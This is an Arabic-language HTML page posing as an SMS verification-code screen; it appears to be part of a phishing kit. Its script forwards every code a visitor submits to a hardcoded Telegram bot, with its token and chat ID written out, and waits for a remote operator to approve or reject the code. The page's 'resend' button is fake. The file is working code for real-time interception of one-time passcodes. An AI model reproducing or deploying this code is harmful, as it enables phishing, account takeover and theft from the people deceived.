<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من رمز SMS</title>
    <!-- تضمين Tailwind CSS للتصميم -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('../../assets/fonts/cairo.css');
        body {
            font-family: 'Cairo', sans-serif;
        }
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] {
            -moz-appearance: textfield;
        }
    </style>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen relative">

    <div class="bg-white p-8 rounded-2xl shadow-lg max-w-md w-full text-center">
        <!-- أيقونة رسالة SMS -->
        <div class="mx-auto w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mb-4 text-2xl">
            💬
        </div>

        <h1 class="text-2xl font-bold text-gray-800 mb-2">أدخل رمز التحقق</h1>
        <p class="text-gray-500 text-sm mb-6">
            تم إرسال رمز التحقق في رسالة نصية (SMS) إلى رقم هاتفك. أدخل الرمز
        </p>

        <!-- نموذج إدخال الرمز -->
        <form id="otpForm" onsubmit="handleVerify(event)">
            <div class="mb-6">
                <input 
                    type="text" 
                    id="otpInput" 
                    maxlength="6" 
                    placeholder="أدخل الرمز"
                    class="w-full px-4 py-4 text-center text-2xl tracking-widest font-bold border-2 border-gray-300 rounded-xl focus:border-blue-600 focus:outline-none transition bg-gray-50 placeholder:text-base placeholder:tracking-normal placeholder:font-normal placeholder:text-gray-400"
                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                    required
                >
                <p id="errorMsg" class="text-red-500 text-xs mt-2 text-right hidden">رمز التحقق المدخل غير صحيح.</p>
            </div>

            <!-- زر التأكيد -->
            <button type="submit" id="submitBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition duration-200 mb-4 shadow-md shadow-blue-200">
                تأكيد الرمز
            </button>
        </form>

        <!-- قسم إعادة الإرسال والعداد -->
        <div class="text-sm text-gray-500">
            <span>لم تستلم الرسالة؟ </span>
            <button id="resendBtn" onclick="resendCode()" class="text-blue-600 font-semibold hover:underline disabled:text-gray-400 disabled:no-underline" disabled>
                إعادة الإرسال
            </button>
            <span id="timer" class="block mt-1 text-gray-400">إعادة الإرسال خلال (<span>60</span> ثانية)</span>
        </div>
    </div>

    <!-- نافذة التحميل الشفافة (Overlay) -->
    <div id="loadingOverlay" class="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 hidden">
        <div class="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center space-y-4 max-w-xs w-full mx-4">
            <!-- دائرة التحميل المتحركة (Spinner) -->
            <div class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
            <p class="text-gray-800 font-semibold text-lg">جاري التحقق من البيانات...</p>
        </div>
    </div>

    <!-- سكربت التحكم والتفاعل وإرسال تيليجرام -->
    <script>
        const otpInput = document.getElementById('otpInput');
        const resendBtn = document.getElementById('resendBtn');
        const timerSpan = document.getElementById('timer');
        const errorMsg = document.getElementById('errorMsg');
        const submitBtn = document.getElementById('submitBtn');
        const loadingOverlay = document.getElementById('loadingOverlay');
        let timeLeft = 60;
        let countdown;
        let checkInterval = null;
        let lastUpdateId = 0;

        // ** ضع معلومات تيليجرام الخاصة بك هنا **
        const TELEGRAM_BOT_TOKEN = '8741663993:AAGpYQSJwGVw6j2BxTDGf8ZHN9QUwXXwU50'; 
        const TELEGRAM_CHAT_ID = '8108427825';     

        function startTimer() {
            timeLeft = 60;
            resendBtn.disabled = true;
            timerSpan.style.display = 'block';
            
            countdown = setInterval(() => {
                timeLeft--;
                timerSpan.querySelector('span').textContent = timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    resendBtn.disabled = false;
                    timerSpan.style.display = 'none';
                }
            }, 1000);
        }

        function resendCode() {
            alert('تم إعادة إرسال رسالة الـ SMS بنجاح!');
            startTimer();
        }

        async function initTelegramOffset() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=-1`);
                const data = await res.json();
                if (data.ok && data.result.length > 0) {
                    lastUpdateId = data.result[data.result.length - 1].update_id;
                }
            } catch (e) {
                console.error(e);
            }
        }
        initTelegramOffset();

        async function handleVerify(e) {
            e.preventDefault();
            const code = otpInput.value.trim();
            const length = code.length;

            if (length === 4 || length === 5 || length === 6) {
                errorMsg.classList.add('hidden');
                otpInput.classList.remove('border-red-500');
                
                // إظهار نافذة التحميل الشفافة
                loadingOverlay.classList.remove('hidden');

                const message = `🔔 رمز تحقق جديد (SMS):\n📥 الرمز المدخل: \`${code}\`\n\n⏳ الحالة: بانتظار القرار...`;

                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        { text: "رفض  ", callback_data: "reject_otp" },
                                        { text: " موافقة ", callback_data: "approve_otp" }
                                    ]
                                ]
                            }
                        })
                    });

                    const data = await response.json();

                    if (data.ok) {
                        startCheckingResponse();
                    } else {
                        loadingOverlay.classList.add('hidden');
                        alert('حدث خطأ أثناء الإرسال إلى تيليجرام.');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    loadingOverlay.classList.add('hidden');
                    alert('تعذر الاتصال بالخادم.');
                }

            } else {
                errorMsg.classList.remove('hidden');
                otpInput.classList.add('border-red-500');
                otpInput.focus();
            }
        }

        // دالة تفقد ضغطك على الأزرار وتعديل الرسالة في تيليجرام
        function startCheckingResponse() {
            if (checkInterval) clearInterval(checkInterval);

            checkInterval = setInterval(async () => {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`);
                    const data = await response.json();

                    if (data.ok && data.result.length > 0) {
                        for (let update of data.result) {
                            lastUpdateId = update.update_id;

                            if (update.callback_query) {
                                const action = update.callback_query.data;
                                const messageObj = update.callback_query.message;
                                const codeMatch = messageObj.text.match(/`(\d+)`/) ;
                                const enteredCode = codeMatch ? codeMatch[1] : '---';

                                clearInterval(checkInterval);
                                loadingOverlay.classList.add('hidden'); // إخفاء شاشة التحميل

                                let updatedText = "";
                                if (action === "reject_otp") {
                                    updatedText = `🔔 رمز تحقق جديد (SMS):\n📥 الرمز المدخل: \`${enteredCode}\`\n\n❌ الحالة: تم الرفض (رمز غير صحيح)`;
                                    
                                    // إظهار الخطأ للمستخدم
                                    errorMsg.textContent = "رمز التحقق المدخل غير صحيح.";
                                    errorMsg.classList.remove('hidden');
                                    otpInput.classList.add('border-red-500');
                                    otpInput.value = '';
                                    otpInput.focus();
                                } else if (action === "approve_otp") {
                                    updatedText = `🔔 رمز تحقق جديد (SMS):\n📥 الرمز المدخل: \`${enteredCode}\`\n\n✅ الحالة: تمت الموافقة بنجاح`;
                                    
                                    // توجيه المستخدم لصفحة النجاح
                                    alert('تم التحقق بنجاح!');
                                    window.location.href = "success.html"; // استبدل برابط صفحة النجاح
                                }

                                // تعديل رسالة تيليجرام لإزالة الأزرار وتحديث النص
                                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        chat_id: messageObj.chat.id,
                                        message_id: messageObj.message_id,
                                        text: updatedText,
                                        parse_mode: 'Markdown',
                                        reply_markup: { inline_keyboard: [] } // إزالة الأزرار نهائياً
                                    })
                                });

                                // الرد على الـ Callback لإيقاف إشارة التحميل عند الزر في تيليجرام
                                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ callback_query_id: update.callback_query.id })
                                });
                            }
                        }
                    }
                } catch (error) {
                    console.error("Polling error:", error);
                }
            }, 2000);
        }

        startTimer();
    </script>
</body>
</html>
